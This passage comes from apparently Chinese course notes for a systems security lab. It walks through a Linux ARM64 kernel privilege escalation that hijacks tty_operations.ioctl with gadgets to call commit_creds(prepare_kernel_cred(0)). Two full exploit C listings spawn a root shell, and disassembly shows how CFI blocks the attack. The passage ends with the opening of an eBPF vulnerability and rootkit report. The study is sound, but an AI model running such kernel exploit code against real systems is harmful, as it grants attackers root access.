<p>\u63a5\u4e0b\u6765\u6211\u4eec\u9700\u8981\u901a\u8fc7\u4e09\u4e2a gadget \u6765\u5b8c\u6210\u5bf9 commit_creds(prepare_kernel_cred(0)) \u7684\u8c03\u7528\u3002\u9996\u5148\u770b\u8fd9\u4e09\u4e2a gadget \u7684\u529f\u80fd\uff1a</p> <ul> <li>gadget1\uff1a\u5c06 x0+0x38 \u5730\u5740\u7684\u503c\u8d4b\u503c\u7ed9 x1\uff0c\u628a x2 \u7684\u503c\u8d4b\u503c\u7ed9 x0\uff0c\u7136\u540e\u8df3\u8f6c\u5230 x1 \u5730\u5740\uff1b</li> <li>gadget2\uff1a\u7ed9 x0 \u8d4b\u503c 0\uff0c\u5c06 x2+0x28 \u5730\u5740\u7684\u503c\u8d4b\u503c\u7ed9 x1\uff0c\u7136\u540e\u8df3\u8f6c\u5230 x1 \u5730\u5740\uff1b</li> <li>gadget3\uff1a\u76f4\u63a5 ret\u3002</li> </ul> <p>\u5e76\u4e14\u5728 ARM \u7684\u8c03\u7528\u89c4\u8303\u4e2d\u53c2\u6570\u5206\u522b\u5b58\u50a8\u5728 x0 x1 x2 \u4e2d\uff0c\u8fd4\u56de\u503c\u5728 x0 \u4e2d\u3002</p> <p>\u4ece\u91cc\u5f80\u5916\u770b\uff0c\u6211\u4eec\u9700\u8981\u5148\u8c03\u7528 prepare_kernel_cred(0)\uff0c\u5728\u4e09\u4e2a gadget \u4e2d gadget2 \u5c06\u7b2c\u4e00\u4e2a\u53c2\u6570 x0 \u8d4b\u503c\u4e3a\u4e86 0\uff0c\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7 gadget2 \u6765\u8c03\u7528 prepare_kernel_cred\uff0c\u8fd9\u5c31\u9700\u8981 x1 \u4e5f\u5c31\u662f x2+0x28 \u5730\u5740\u5904\u7684\u503c\u4e3a prepare_kernel_cred \u7684\u5730\u5740\u3002\u5982\u679c\u8981\u5229\u7528 tty_struct \u6765\u8fdb\u884c x2+0x28 \u7684\u5b58\u50a8\uff0c\u5219\u9700\u8981\u5148\u83b7\u53d6 tty_struct \u7684\u5730\u5740\u3002</p> <p>\u4e3a\u4e86\u83b7\u53d6 tty_struct \u5730\u5740\uff0c\u5728\u5b9e\u9a8c\u6307\u5bfc\u4e2d\u6211\u4eec\u77e5\u9053 ioctl \u51fd\u6570\u5728\u8c03\u7528 tty_operations \u4e2d\u7684 ioctl \u51fd\u6570\u7684\u65f6\u5019\u5c31\u5df2\u7ecf\u5c06\u7b2c\u4e00\u4e2a\u53c2\u6570\u5373 x0 \u6539\u4e3a tty_struct \u5730\u5740\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u7528 gadget3 \u8fd4\u56de\u5373\u53ef\u5c06\u5730\u5740\u5b58\u5165 x0 \u5373\u8fd4\u56de\u503c\u4e2d\u3002</p> <p>\u63a5\u4e0b\u6765\u5728\u8c03\u7528\u4e86 prepare_kernel_cred(0) \u4e4b\u540e\uff0cx0 \u4e5f\u5c31\u662f\u8fd4\u56de\u503c\u5c31\u662f\u5e26\u6709 root \u6743\u9650\u7684 cred \u7ed3\u6784\u4f53\u7684\u5730\u5740\u4e86\uff0c\u63a5\u4e0b\u6765\u53ea\u9700\u8981\u5c06\u8fd9\u4e2a\u5730\u5740\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u8c03\u7528 commit_creds \u51fd\u6570\u5373\u53ef\uff0c\u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528 gadget1\uff0c\u5c06 commit_creds \u5730\u5740\u5b58\u5165 x0+0x38 \u4e5f\u5c31\u662f tty_struct+0x38 \u4e2d\uff0c\u7136\u540e\u5c06\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5373 x2 \u8d4b\u503c\u4e3a root_cred\uff0c\u8fd9\u6837\u5728\u8c03\u7528\u7684\u65f6\u5019\u5c31\u4f1a\u8d4b\u503c\u5230 x0 \u4e2d\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u8c03\u7528 commit_creds\u3002</p> <p>\u53e6\u5916\u9700\u8981\u6ce8\u610f\uff0cioctl \u8fd4\u56de\u7684\u7c7b\u578b\u662f int\uff0c\u53ea\u6709\u56db\u4e2a\u5b57\u8282\uff0c\u800c\u8fd9\u4e9b struct \u7684\u5730\u5740\u662f 8 \u5b57\u8282\uff0c\u4f46\u6070\u597d\u5934\u56db\u5b57\u8282\u90fd\u662f 0xffff0000 \u6240\u4ee5\u53ea\u9700\u8981\u6216\u4e0a 0xffff000000000000 \u5c31\u53ef\u4ee5\u4e86\u3002</p> <pre><code>size_t zju_gadget1_addr = 0xffff80001083aa44;\nsize_t zju_gadget2_addr = 0xffff80001083aa5c;\nsize_t zju_gadget3_addr = 0xffff80001083aa74;\nsize_t prepare_kernel_cred_addr = 0xffff8000100b6030;\nsize_t commit_creds_addr = 0xffff8000100b5bac;\n\nstruct tty_operations {\n    char prefix[8 * 4];\n    void *close;\n    char useless[8 * 7];\n    void *ioctl;\n    char rest[8 * 23];\n} hack_ops;\n\nstruct tty_struct {\n    int magic;\n    char kref_dev_driver_data[20];\n    struct tty_operations *ops;\n    char useless[8];\n    size_t tty_0x28;\n    size_t tty_0x30;\n    size_t tty_0x38;\n    char rest[0x2B8 - 0x40];\n} tty_buf, hack_buf;\n\nvoid task3(int dev_fd, int ptmx_fd) {\n    printf(\"[*] task3 hacking...\\n\");\n    memcpy(&amp;hack_buf, &amp;tty_buf, sizeof(tty_buf));\n    hack_buf.ops = &amp;hack_ops;\n    hack_buf.tty_0x28 = prepare_kernel_cred_addr;\n    hack_buf.tty_0x38 = commit_creds_addr;\n    write(dev_fd, &amp;hack_buf, 0x40);\n    hack_ops.ioctl = (void *)zju_gadget3_addr;\n    size_t tty_struct_addr = ioctl(ptmx_fd, 0x0, 0x0) | 0xffff000000000000;\n    printf(\"[*] tty_struct_addr: 0x%lx\\n\", tty_struct_addr);\n    hack_ops.ioctl = (void *)zju_gadget2_addr;\n    size_t root_cred = ioctl(ptmx_fd, 0x0, &amp;hack_buf) | 0xffff000000000000;\n    printf(\"[*] root_cred: 0x%lx\\n\", root_cred);\n    hack_ops.ioctl = (void *)zju_gadget1_addr;\n    ioctl(ptmx_fd, 0x0, root_cred);\n    system(\"/bin/sh\");\n    return;\n}\n</code></pre> <p>\u540c\u6837\u7f16\u8bd1\u8fd0\u884c exp\uff0c\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u6210\u529f\u83b7\u53d6\u5230\u4e86 root \u6743\u9650\uff1a</p> <p>\u4f46\u5b9e\u9645\u4e0a\u5373\u4f7f\u4e0d\u83b7\u53d6 tty_struct \u7ed3\u6784\u4f53\u7684\u5730\u5740\u4e5f\u53ef\u4ee5\u3002\u6211\u4eec\u524d\u9762\u9700\u8981 tty_struct \u5730\u5740\u7684\u4f4d\u7f6e\u53ea\u6709\u5728\u7528 gadget2 \u7684\u65f6\u5019\u9700\u8981 tty_struct \u4f5c\u4e3a x2 \u6765\u4f7f\u5f97\u8df3\u8f6c\u7684\u5730\u5740\u5728 tty_struct+0x28 \u4e2d\u3002\u4f46\u7531\u4e8e\u6ca1\u6709\u5f00\u542f SMAP \u4fdd\u62a4\uff0c\u6240\u4ee5\u5185\u6838\u4e5f\u53ef\u4ee5\u8bfb\u53d6\u7528\u6237\u6001\u7684\u5185\u5b58\uff0c\u53ea\u9700\u8981\u5728\u7a0b\u5e8f\u91cc\u968f\u4fbf\u521b\u5efa\u4e00\u4e2a buffer \u7136\u540e\u5c06\u5176 0x28 \u5f00\u59cb\u7684\u4f4d\u7f6e\u5199\u4e3a prepare_kernel_cred \u51fd\u6570\u5730\u5740\uff0c\u5728\u5c06\u8fd9\u4e2a buffer \u7684\u5730\u5740\u4f5c\u4e3a x2 \u8c03\u7528 gadget2 \u5373\u53ef\uff0c\u8fd9\u6837\u6211\u4eec gadget3 \u4e5f\u4e0d\u9700\u8981\u4e86\uff0c\u53ea\u9700\u8981\u4e24\u6b21 ioctl \u5c31\u53ef\u4ee5\u5b8c\u6210\uff1a</p> <pre><code>size_t zju_gadget1_addr = 0xffff80001083aa44;\nsize_t zju_gadget2_addr = 0xffff80001083aa5c;\nsize_t prepare_kernel_cred_addr = 0xffff8000100b6030;\nsize_t commit_creds_addr = 0xffff8000100b5bac;\n\nstruct tty_operations {\n    char prefix[8 * 4];\n    void *close;\n    char useless[8 * 7];\n    void *ioctl;\n    char rest[8 * 23];\n} hack_ops;\n\nstruct tty_struct {\n    int magic;\n    char kref_dev_driver_data[20];\n    struct tty_operations *ops;\n    char useless[24];\n    size_t tty_0x38;\n    char rest[0x2B8 - 0x40];\n} tty_buf, hack_buf;\n\nstruct for_gadget2 {\n    char useless[0x28];\n    size_t x2_0x28;\n} gadget2_buf;\n\nvoid task3(int dev_fd, int ptmx_fd) {\n    printf(\"[*] task3 hacking...\\n\");\n    memcpy(&amp;hack_buf, &amp;tty_buf, sizeof(tty_buf));\n    hack_buf.ops = &amp;hack_ops;\n    hack_buf.tty_0x38 = commit_creds_addr;\n    write(dev_fd, &amp;hack_buf, 0x40);\n    hack_ops.ioctl = (void *)zju_gadget2_addr;\n    gadget2_buf.x2_0x28 = prepare_kernel_cred_addr;\n    size_t root_cred = ioctl(ptmx_fd, 0x0, &amp;gadget2_buf) | 0xffff000000000000;\n    printf(\"[*] root_cred: 0x%lx\\n\", root_cred);\n    hack_ops.ioctl = (void *)zju_gadget1_addr;\n    ioctl(ptmx_fd, 0x0, root_cred);\n    system(\"/bin/sh\");\n    return;\n}\n</code></pre> <p>Question 4\uff1a\u4e3a\u4ec0\u4e48\u7b2c\u4e8c\u6b65\u53ef\u4ee5\u76f4\u63a5 ret \u83b7\u53d6\u5230 tty_struct \u7ed3\u6784\u4f53\u7684\u5730\u5740\uff1fret \u6267\u884c\u524d\u540e\u7684\u63a7\u5236\u6d41\u662f\u4ec0\u4e48\u6837\u7684\uff1f</p> <p>\u524d\u9762\u5176\u5b9e\u5df2\u7ecf\u5206\u6790\u8fc7\uff0c\u6211\u4eec\u5728\u8c03\u7528 Linux \u63d0\u4f9b\u7684 ioctl \u7cfb\u7edf\u8c03\u7528\u7684\u65f6\u5019\u53c2\u6570\u4e3a fd, cmd, arg\uff0c\u800c\u5b83\u4f1a\u8fdb\u4e00\u6b65\u6839\u636e fd \u6765\u5206\u914d\u7ed9\u4e0d\u540c\u8bbe\u5907\u7684 ioctl \u7684\u5904\u7406\u51fd\u6570\uff0c\u5728\u5206\u914d\u7ed9 ptmx \u7684\u65f6\u5019\u5c31\u662f\u8c03\u7528 tty_operations.ioctl(struct tty_struct *tty, unsigned int cmd, unsigned long arg)\uff0c\u5176 tty_struct \u5730\u5740\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b58\u50a8\u5728 x0 \u4e2d\u7684\uff0c\u8fd9\u65f6\u5982\u679c\u8fd9\u4e2a ioctl \u51fd\u6570\u7684\u5185\u5bb9\u53ea\u6709 ret\uff0c\u90a3\u4e48\u5c31\u4f1a\u8fd4\u56de x0 \u7684\u503c\uff0c\u4e5f\u5c31\u662f tty_struct \u7684\u5730\u5740\u3002</p> <p>ret \u6267\u884c\u524d\u540e\u7684\u63a7\u5236\u6d41\u4e3a\uff1a</p> <ul> <li>task3 \u51fd\u6570</li> <li>\u8c03\u7528 ioctl(ptmx_fd, 0x0, 0x0)</li> <li>ioctl \u8c03\u7528 tty_operations.ioctl(&amp;tty_struct, 0, 0)\uff08\u5176\u5b9e\u662f zju_gadget3\uff09</li> <li>zju_gadget3 \u4e2d ret \u8fd4\u56de tty_struct \u5730\u5740</li> <li>\u8fd4\u56de\u5230 ioctl \u4e2d\uff0c\u518d\u8fd4\u56de\u5230 task3 \u4e2d</li> </ul>"},{"location":"sec/syssec/lab3/#task-4","title":"Task 4","text":"<p>Linux \u4ee3\u7801\u7684 /drivers/tty/tty_ioctl.c \u4e2d\u5c31\u6709\u5f88\u591a\u95f4\u63a5\u8c03\u7528\uff0c\u800c\u4e14\u51fd\u6570\u672c\u8eab\u4e5f\u5f88\u77ed\uff0c\u6bd4\u5982\u7b2c\u4e00\u4e2a\uff1a</p> <pre><code>unsigned int tty_chars_in_buffer(struct tty_struct *tty)\n{\n    if (tty-&gt;ops-&gt;chars_in_buffer)\n        return tty-&gt;ops-&gt;chars_in_buffer(tty);\n    return 0;\n}\n</code></pre> <p>\u6ca1\u5f00\u542f CFI \u7684\u6c47\u7f16\u5982\u4e0b\uff1a</p> <pre><code>ffff800010765554 &lt;tty_chars_in_buffer&gt;:\nffff800010765554:   d503233f    paciasp\nffff800010765558:   a9bf7bfd    stp x29, x30, [sp, #-16]!\nffff80001076555c:   910003fd    mov x29, sp\nffff800010765560:   f9400c08    ldr x8, [x0, #24]\nffff800010765564:   f9402d08    ldr x8, [x8, #88]\nffff800010765568:   b4000068    cbz x8, ffff800010765574 &lt;tty_chars_in_buffer+0x20&gt;\nffff80001076556c:   d63f0100    blr x8\nffff800010765570:   14000002    b   ffff800010765578 &lt;tty_chars_in_buffer+0x24&gt;\nffff800010765574:   2a1f03e0    mov w0, wzr\nffff800010765578:   a8c17bfd    ldp x29, x30, [sp], #16\nffff80001076557c:   d50323bf    autiasp\nffff800010765580:   d65f03c0    ret\n</code></pre> <p>\u5f00\u542f\u4e86 CFI \u7684\u6c47\u7f16\u5982\u4e0b\uff1a</p> <pre><code>ffff800008bd95f0 &lt;tty_chars_in_buffer&gt;:\nffff800008bd95f0:   d503233f    paciasp\nffff800008bd95f4:   d10083ff    sub sp, sp, #0x20\nffff800008bd95f8:   f9400c08    ldr x8, [x0, #24]\nffff800008bd95fc:   a9017bfd    stp x29, x30, [sp, #16]\nffff800008bd9600:   910043fd    add x29, sp, #0x10\nffff800008bd9604:   f9402d08    ldr x8, [x8, #88]\nffff800008bd9608:   b4000128    cbz x8, ffff800008bd962c &lt;tty_chars_in_buffer+0x3c&gt;\nffff800008bd960c:   d00061c9    adrp    x9, ffff800009813000 &lt;regulator_get_current_limit.cfi_jt&gt;\nffff800008bd9610:   912ac129    add x9, x9, #0xab0\nffff800008bd9614:   cb090109    sub x9, x8, x9\nffff800008bd9618:   93c90d29    ror x9, x9, #3\nffff800008bd961c:   f100253f    cmp x9, #0x9\nffff800008bd9620:   54000102    b.cs    ffff800008bd9640 &lt;tty_chars_in_buffer+0x50&gt;  // b.hs, b.nlast\nffff800008bd9624:   d63f0100    blr x8\nffff800008bd9628:   14000002    b   ffff800008bd9630 &lt;tty_chars_in_buffer+0x40&gt;\nffff800008bd962c:   2a1f03e0    mov w0, wzr\nffff800008bd9630:   a9417bfd    ldp x29, x30, [sp, #16]\nffff800008bd9634:   910083ff    add sp, sp, #0x20\nffff800008bd9638:   d50323bf    autiasp\nffff800008bd963c:   d65f03c0    ret\nffff800008bd9640:   a90023e0    stp x0, x8, [sp]\nffff800008bd9644:   d2931760    mov x0, #0x98bb                 // #39099\nffff800008bd9648:   f2bc3380    movk    x0, #0xe19c, lsl #16\nffff800008bd964c:   f000ee42    adrp    x2, ffff80000a9a4000 &lt;dev_attr_active.104611&gt;\nffff800008bd9650:   f2ce3760    movk    x0, #0x71bb, lsl #32\nffff800008bd9654:   91090042    add x2, x2, #0x240\nffff800008bd9658:   f2f02900    movk    x0, #0x8148, lsl #48\nffff800008bd965c:   aa0803e1    mov x1, x8\nffff800008bd9660:   97db5e95    bl  ffff8000082b10b4 &lt;__cfi_slowpath_diag&gt;\nffff800008bd9664:   a94023e0    ldp x0, x8, [sp]\nffff800008bd9668:   17ffffef    b   ffff800008bd9624 &lt;tty_chars_in_buffer+0x34&gt;\n</code></pre> <p>\u4e3b\u8981\u68c0\u6d4b\u6d41\u7a0b\u5728\u4e8e\uff1a</p> <pre><code>ffff800008bd9608:   b4000128    cbz x8, ffff800008bd962c &lt;tty_chars_in_buffer+0x3c&gt;\nffff800008bd960c:   d00061c9    adrp    x9, ffff800009813000 &lt;regulator_get_current_limit.cfi_jt&gt;\nffff800008bd9610:   912ac129    add x9, x9, #0xab0\nffff800008bd9614:   cb090109    sub x9, x8, x9\nffff800008bd9618:   93c90d29    ror x9, x9, #3\nffff800008bd961c:   f100253f    cmp x9, #0x9\nffff800008bd9620:   54000102    b.cs    ffff800008bd9640 &lt;tty_chars_in_buffer+0x50&gt;  // b.hs, b.nlast\nffff800008bd9624:   d63f0100    blr x8\n</code></pre> <p>x8 \u662f\u8981\u8df3\u8f6c\u7684 tty-&gt;ops-&gt;chars_in_buffer \u51fd\u6570\u7684\u5730\u5740\uff0c\u5982\u679c x8 \u4e3a 0 \u5219\u8df3\u8f6c\u5230\u7ed3\u5c3e\u8fd4\u56de\uff0c\u5426\u5219\u8fdb\u884c\u6bd4\u8f83\uff0c\u5148 adrp x9, ... \u5c06 regulator_get_current_limit.cfi_jt \u7684\u9ad8\u5730\u5740\u8f7d\u5165 x9\uff0c\u518d\u52a0\u4e0a 0xab0\uff0c\u7136\u540e\u7528 x8 \u51cf\u53bb x9\uff0c\u7136\u540e\u53f3\u79fb 3 \u4f4d\uff0c\u518d\u548c 0x9 \u6bd4\u8f83\uff0c\u5982\u679c\u5927\u4e8e\u7b49\u4e8e 0x9 \u5219\u4e3a\u975e\u6cd5\u5730\u5740\uff0c\u8df3\u8f6c\u5230\u51fd\u6570\u672b\u5c3e\u7684\u5904\u7406\u6d41\u7a0b\u901a\u8fc7\u8c03\u7528 __cfi_slowpath_diag \u5f15\u53d1 CFI Failure \u5426\u5219\u6b63\u5e38\u8df3\u8f6c\u5230 x8 \u8fdb\u884c\u8c03\u7528\u3002</p> <p>\u5728\u5f00\u542f\u4e86 CFI \u7684 kernel \u4e2d\u8fd0\u884c Task 2 \u4e2d\u4fee\u6539\u4e86\u51e0\u4e2a\u5730\u5740\u540e\u7684\u653b\u51fb\u4ee3\u7801\uff0c\u53d1\u73b0\u5e76\u4e0d\u6210\u529f\uff1a</p> <p>\u51fa\u73b0\u4e86\u6bb5\u9519\u8bef\uff0c\u7136\u540e\u6211\u4eec\u901a\u8fc7 dmesg \u67e5\u770b\u5185\u6838\u65e5\u5fd7\uff0c\u53ef\u4ee5\u53d1\u73b0\uff1a</p> <p>\u53ef\u4ee5\u770b\u5230\u5728\u5199\u5165 zjudev \u540e\u8c03\u7528 close \u7684\u65f6\u5019\u51fa\u73b0\u4e86 CFI Failure\uff0c\u5bfc\u81f4\u653b\u51fb\u5931\u8d25\u3002</p>"},{"location":"sec/syssec/lab3/#_3","title":"\u601d\u8003\u9898\u56de\u7b54","text":"<p>Question 1\uff1a\u4e3a\u4ec0\u4e48\u4f1a\u8fd9\u6837\uff1f\u4e3a\u4ec0\u4e48\u4e24\u6b21\u5206\u914d\u7684\u5185\u5b58\u5757\u5730\u5740\u4f1a\u4e00\u6837\uff1f</p> <p>\u56e0\u4e3a\u5728 glibc \u7684\u5806\u7ba1\u7406\u673a\u5236\u4e2d\uff0cmalloc \u4f1a\u9700\u8981\u901a\u8fc7 brk \u7cfb\u7edf\u8c03\u7528\u6765\u5206\u914d\u5185\u5b58\uff0c\u8fd9\u4e00\u6b65\u6bd4\u8f83\u6d88\u8017\u65f6\u95f4\uff0c\u4e3a\u4e86\u907f\u514d\u9891\u7e41\u5206\u914d\u548c\u91ca\u653e\u5185\u5b58\u9020\u6210\u7684\u6027\u80fd\u5f71\u54cd\uff0cglibc \u4f1a\u5c06\u91ca\u653e\u6389\u7684\u5185\u5b58 chunk \u653e\u5165\u4e00\u4e9b bin \u7684\u94fe\u8868\u4e2d\uff0c\u5728\u4e0b\u6b21\u5206\u914d\u540c\u6837\u5927\u5c0f\u7684 chunk \u65f6\uff0c\u53ef\u4ee5\u76f4\u63a5\u4ece bin \u4e2d\u53d6\u51fa\u6765\uff0c\u4e0d\u9700\u8981\u518d\u6b21\u901a\u8fc7 brk \u8fdb\u884c\u5206\u914d\u3002\u6240\u4ee5\u5982\u679c\u6211\u4eec\u521a\u521a free \u4e86\u4e00\u4e2a chunk\uff0c\u7136\u540e\u53c8 malloc \u4e86\u540c\u6837\u5927\u5c0f\u7684 chunk\uff0c\u5219\u5927\u6982\u7387\u4f1a\u76f4\u63a5\u4ece bin \u4e2d\u53d6\u51fa\u6765\uff0c\u6240\u4ee5\u5730\u5740\u662f\u4e00\u6837\u7684\u3002</p> <p>Question 2-4 \u5728\u4e0a\u9762 Task 1-3 \u7684\u5b9e\u9a8c\u8fc7\u7a0b\u4e2d\u5df2\u7ecf\u56de\u7b54\u3002</p>"},{"location":"sec/syssec/project/","title":"\u5185\u6838 eBPF \u6280\u672f\u7b80\u4ecb\u4e0e\u5b89\u5168\u6f0f\u6d1e\u5206\u6790","text":"<p> \u7ea6 7477 \u4e2a\u5b57  446 \u884c\u4ee3\u7801  10 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 30 \u5206\u949f</p> <p>Abstract</p> <p>\u7f51\u7edc\u5b89\u5168\u5927\u4f5c\u4e1a\u62a5\u544a\uff0c\u540c\u65f6\u9664\u53bb\u5404\u6f0f\u6d1e\u5177\u4f53\u590d\u73b0\u4ee5\u53ca rookit \u90e8\u5206\u4e4b\u5916\u7684\u4e5f\u4f5c\u4e3a\u540c\u5b66\u671f\u201c\u8ba1\u7b97\u673a\u79d1\u5b66\u601d\u60f3\u53f2\u201d\u7684\u5927\u4f5c\u4e1a\u8bba\u6587\u3002</p> <p>\u672c\u6587\u4ecb\u7ecd\u4e86 Linux \u5185\u6838\u4e2d eBPF \u6280\u672f\u7684\u8d77\u6e90\u4e0e\u7b80\u4ecb\uff0c\u5e76\u4ecb\u7ecd\u4e86 eBPF \u7684\u8fd0\u884c\u903b\u8f91\u548c\u5b89\u5168\u8bbe\u8ba1\uff0c\u540e\u5206\u6790\u4e86 eBPF \u76f8\u5173\u7684\u56db\u4e2a\u6f0f\u6d1e CVE-2020-8835\u3001CVE-2020-27194\u3001CVE-2021-3490 \u548c CVE-2022-23222\uff0c\u5206\u6790\u4e86\u5176\u539f\u7406\u548c\u5229\u7528\u65b9\u5f0f\uff0c\u5e76\u63d0\u51fa\u4e86 eBPF \u5e38\u51fa\u73b0\u7684\u6f0f\u6d1e\u603b\u7ed3\uff0c\u540e\u57fa\u4e8e CVE-2020-8835 \u8be6\u7ec6\u5206\u6790\u4e86\u7ed5\u8fc7\u68c0\u6d4b\u540e\u7684 eBPF \u5185\u6838\u63d0\u6743\u5229\u7528\u3002\u6700\u540e\u4ecb\u7ecd\u4e86\u57fa\u4e8e eBPF \u7684 rootkit \u539f\u7406\uff0c\u5e76\u590d\u73b0\u4e86 bad-bpf rootkit \u7684\u529f\u80fd\u3002</p>"},{"location":"sec/syssec/project/#ebpf_1","title":"eBPF \u8d77\u6e90\u4e0e\u7b80\u4ecb","text":"<p>eBPF \u662f\u4e00\u9879\u9769\u547d\u6027\u7684\u6280\u672f\uff0c\u8d77\u6e90\u4e8e Linux \u5185\u6838\uff0c\u5b83\u53ef\u4ee5\u5728\u7279\u6743\u4e0a\u4e0b\u6587\u4e2d\uff08\u5982\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\uff09\u8fd0\u884c\u6c99\u76d2\u7a0b\u5e8f\u3002\u5b83\u7528\u4e8e\u5b89\u5168\u6709\u6548\u5730\u6269\u5c55\u5185\u6838\u7684\u529f\u80fd\uff0c\u800c\u65e0\u9700\u901a\u8fc7\u66f4\u6539\u5185\u6838\u6e90\u4ee3\u7801\u6216\u52a0\u8f7d\u5185\u6838\u6a21\u5757\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0\u3002</p>"},{"location":"sec/syssec/project/#bpf","title":"BPF","text":"<p>BPF\uff08Berkeley Packet Filter\uff09\uff0c\u5373\u4f2f\u514b\u5229\u5305\u8fc7\u6ee4\u5668\uff0c\u662f\u7c7b Unix \u7cfb\u7edf\u4e0a\u6570\u636e\u94fe\u8def\u5c42\u7684\u4e00\u79cd\u539f\u59cb\u63a5\u53e3\uff0c\u63d0\u4f9b\u539f\u59cb\u94fe\u8def\u5c42\u5c01\u5305\u7684\u6536\u53d1\u30021992 \u5e74\uff0cMcCanne \u548c Jacbson \u5728 USENIX '93 \u53d1\u8868\u4e86\u6587\u7ae0 The BSD packet filter: a new architecture for user-level packet capture\uff0c\u6587\u4e2d\u4ecb\u7ecd\u4e86\u4ed6\u4eec\u5728 Unix \u5185\u6838\u5b9e\u73b0\u7f51\u7edc\u6570\u636e\u5305\u8fc7\u6ee4\uff0cBPF \u6280\u672f\u6bd4\u5f53\u65f6\u6700\u5148\u8fdb\u7684\u6570\u636e\u5305\u8fc7\u6ee4\u6280\u672f\u5feb 20 \u500d\u3002BPF \u5728\u6570\u636e\u5305\u8fc7\u6ee4\u4e0a\u5f15\u5165\u65b0\u865a\u62df\u673a\u7684\u8bbe\u8ba1\uff0c\u5e76\u4e14\u53ea\u7f13\u5b58\u4e0e\u8fc7\u6ee4\u6570\u636e\u5305\u76f8\u5173\u7684\u6570\u636e\uff0c\u800c\u4e0d\u662f\u590d\u5236\u6570\u636e\u5305\u7684\u6240\u6709\u4fe1\u606f\uff0c\u8fd9\u6837\u53ef\u4ee5\u6700\u5927\u7a0b\u5ea6\u5730\u51cf\u5c11 BPF \u5904\u7406\u7684\u6570\u636e\u3002\u56e0\u4e3a BPF \u6548\u7387\u63d0\u5347\u5de8\u5927\uff0c\u7edd\u5927\u591a\u6570 *nix \u7cfb\u7edf\u90fd\u9009\u62e9\u91c7\u7528 BPF \u4f5c\u4e3a\u6570\u636e\u5305\u8fc7\u6ee4\u6280\u672f\u3002BPF \u5de5\u4f5c\u5728\u5185\u6838\u4e2d\uff0c\u5176\u7ed3\u6784\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p>\u5373\u76f4\u63a5\u5728\u6570\u636e\u94fe\u8def\u5c42\u6355\u83b7\u6d41\u91cf\u5305\u5e76\u8fdb\u884c\u8fc7\u6ee4\uff0c\u518d\u8fd4\u56de\u7ed9\u7528\u6237\u3002BPF \u901a\u8fc7 JIT\uff08Just-In-Time\uff09\u53ca\u65f6\u7f16\u8bd1\u5668\u5c06 BPF \u6307\u4ee4\u7f16\u8bd1\u4e3a\u672c\u673a\u5b57\u8282\u7801\u8fdb\u884c\u6267\u884c\uff0c\u4ee5\u63d0\u9ad8\u6267\u884c\u6548\u7387\u3002</p>"},{"location":"sec/syssec/project/#ebpf_2","title":"eBPF","text":"<p>\u5728 2014 \u5e74\uff0cAlexei Starovoitov \u57fa\u4e8e\u5148\u524d\u7684 BPF \u5b9e\u73b0\u4e86 eBPF\uff08extended Berkeley Packet Filter\uff09\uff0c\u5c06\u539f\u5148\u7684\u53ea\u7528\u4e8e\u7f51\u7edc\u5305\u8fc7\u6ee4\u7684\u5185\u6838\u6001\u8fc7\u6ee4\u5668\u6269\u5c55\u4e3a\u4e86\u901a\u7528\u7684\u5185\u6838\u5b57\u8282\u7801\u6267\u884c\u5f15\u64ce\u3002</p> <p>eBPF \u6700\u65e9\u51fa\u73b0\u5728 Linux 3.18 \u5185\u6838\u4e2d\uff0c\u6b64\u540e\u539f\u6765\u7684 BPF \u5c31\u88ab\u79f0\u4e3a cBPF\uff08classic BPF\uff09\uff0ccBPF \u73b0\u5728\u5df2\u7ecf\u57fa\u672c\u5e9f\u5f03\uff0c\u539f\u6709\u7528\u6cd5\u4e5f\u901a\u8fc7 eBPF \u91cd\u65b0\u5b9e\u73b0\u3002</p> <p>eBPF \u5728 BPF \u6307\u4ee4\u96c6\u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u4e86\u6269\u5c55\uff0c\u4f7f\u7528\u4e86\u66f4\u591a\u7684\u5bc4\u5b58\u5668\u4e0e\u66f4\u5927\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u5e76\u4e14\u6269\u5c55\u4e86\u5728\u5185\u6838\u6267\u884c\u65f6\u53ef\u4ee5\u4f7f\u7528\u7684\u7cfb\u7edf\u8c03\u7528\u3002\u4f7f\u5f97\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528\u51fd\u6570\u53c2\u6570\u81ea\u7531\u4ea4\u6362\u66f4\u591a\u7684\u4fe1\u606f\uff0c\u7f16\u5199\u66f4\u590d\u6742\u7684\u7a0b\u5e8f\u3002</p> <p>BPF \u53ea\u9650\u4e8e\u5185\u6838\u6001\u4f7f\u7528\uff0c\u53ea\u6709\u5c11\u90e8\u5206\u7528\u6237\u7a0b\u5e8f\u53ef\u4ee5\u7f16\u5199\u5e76\u521b\u5efa BPF \u8fc7\u6ee4\u5668\uff0c\u6bd4\u5982 tcpdump \u548c seccomp\u3002\u800c eBPF \u5c06\u5176\u6269\u5c55\u5230\u4e86\u7528\u6237\u6001\uff0ceBPF \u4e0d\u518d\u5c40\u9650\u4e8e\u7f51\u7edc\u6808\uff0c\u800c\u662f\u6210\u4e3a\u4e86\u5185\u6838\u4e2d\u7684\u4e00\u4e2a\u5b50\u7cfb\u7edf\u3002eBPF \u7a0b\u5e8f\u66f4\u50cf\u4e00\u4e2a\u5185\u6838\u6a21\u5757\uff0c\u4f46\u6bd4\u5185\u6838\u6a21\u5757\u66f4\u5f3a\u8c03\u5b89\u5168\u548c\u7a33\u5b9a\uff0c\u4e0d\u9700\u8981\u91cd\u65b0\u7f16\u8bd1\u5185\u6838\uff0c\u4e5f\u4e0d\u4f1a\u9020\u6210\u5185\u6838\u5d29\u6e83\u3002</p>"},{"location":"sec/syssec/project/#ebpf_3","title":"eBPF \u539f\u7406\u4e0e\u5b89\u5168\u8bbe\u8ba1","text":""},{"location":"sec/syssec/project/#ebpf_4","title":"eBPF \u8fd0\u884c\u903b\u8f91","text":"<p>eBPF 